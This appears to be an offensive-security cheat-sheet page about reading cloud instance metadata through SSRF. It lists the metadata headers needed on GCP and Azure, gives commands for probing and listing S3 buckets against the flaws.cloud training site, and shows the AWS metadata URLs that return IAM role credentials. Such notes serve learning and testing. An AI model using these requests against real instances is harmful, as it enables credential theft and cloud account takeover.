---
title: "Cloud"
date: 2019-03-26T08:47:11+01:00
tags:
 - cloud
 - AWS
 - GCP
 - Azure
 - DigitalOcean
 - SSRF
---


## Get Cloud Metadata

When you have access to the internal network (SSRF, RCE, ...) you can read
metadata of the server instance. All cloud providers use the same endpoint:
`169.254.169.254`.

On GCP and Azure you need to add some custom header, so a simple SSRF may not be
enough.

- GCP: `Metadata-Flavor: Google` (or the previous header `X-Google-Metadata-Request: True`)
- Azure: `Metadata: true`

Here the documentation for various cloud providers:

- [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [Azure](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [GCP](https://cloud.google.com/compute/docs/storing-retrieving-metadata)
- [DigitalOcean](https://developers.digitalocean.com/documentation/metadata/)


## AWS

### Check if domain is on a bucket
```bash
dig +nocmd flaws.cloud any +multiline +noall +answer
```

### List a bucket
```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

### SSRF on AWS to get credentials

On AWS there is a metadata server that can be accessed through the REST API
located at: `http://169.254.169.254`.
Sending a GET requests to the following endpoint will dump a list of roles that
are attaches to the current EC2 instance.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

### Resources on AWS

- [flaws.cloud](http://flaws.cloud/)
